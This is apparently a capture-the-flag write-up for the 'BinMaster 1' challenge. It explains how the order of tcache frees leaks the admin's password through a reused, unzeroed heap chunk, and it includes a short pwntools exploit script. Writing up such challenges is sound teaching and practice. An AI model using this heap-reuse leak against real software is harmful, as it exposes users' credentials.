# BinMaster 1

The challenge is a simple allocation challenge, where we can allocate up to 10 user with their own password and usernames into an array of current users.

We can delete a user and we can also print all the user's informations.

```c
int menu()
{
  puts("1. Login");
  puts("2. Add user");
  puts("3. Delete user");
  puts("4. List user");
  puts("5. Exit");
  return printf("> ");
}
```

The vulnerability lies in the order that the free and malloc function are called: when freed, chunks the size of the users one end up in the t-cache bin.

The t-cache bin is a lifo queue of freed chunks, and when chunks are allocated, the first chunk in the t-cache bin is returned.

Since the chunks are freed in this order:
```c
if ( chosen_user )
{
    free(chosen_user->username);
    free(users[slot]->password);
    free(users[slot]);
    users[slot] = 0LL;
    return 0LL;
}
```

The t-cache bin will look something like this:
```
deleted_user->deleted_password->deleted_username
```

When we allocate a new user, the first chunk in the t-cache bin will be returned, and the username and password will swap places.

Since the data that was previously in the password chunk is now in the username chunk and doesent get zeroed out, we can leak the password of the previous user.

The exploit is simple, we just need to deallocate the admin, allocate a new user, and print the username.

```py
from pwn import *


E = ELF('./bin_master')
p = E.process()

#delete the admin
p.sendlineafter(b'>', b'3')
p.sendlineafter(b'>', b'0')

#create a new user
p.sendlineafter(b'>', b'2')
p.sendlineafter(b'>', b'1')
p.sendafter(b':', b'A'*0x12)
p.sendafter(b':', b'A'*8)

#print all the usernames
p.sendlineafter(b'>', b'4')

p.interactive()


```